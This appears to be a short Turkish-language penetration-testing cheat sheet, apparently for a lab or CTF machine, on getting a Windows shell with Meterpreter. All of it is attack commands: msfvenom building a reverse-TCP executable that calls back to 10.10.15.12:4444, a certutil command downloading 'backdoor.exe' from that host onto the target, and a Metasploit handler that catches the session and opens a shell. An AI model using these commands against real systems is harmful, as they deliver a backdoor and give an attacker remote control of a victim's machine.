## windows shell alma meterpreter

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.15.12 LPORT=4444 -f exe -o exploit.exe
```

**ile exploit oluştur ve sisteme bunun ile at**

```bash
certutil+-urlcache+-f+http://10.10.15.12:80/backdoor.exe+exploit.exe
```

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.12
set LPORT  4444 
run

# shell aldıkdan sonra

shell
```
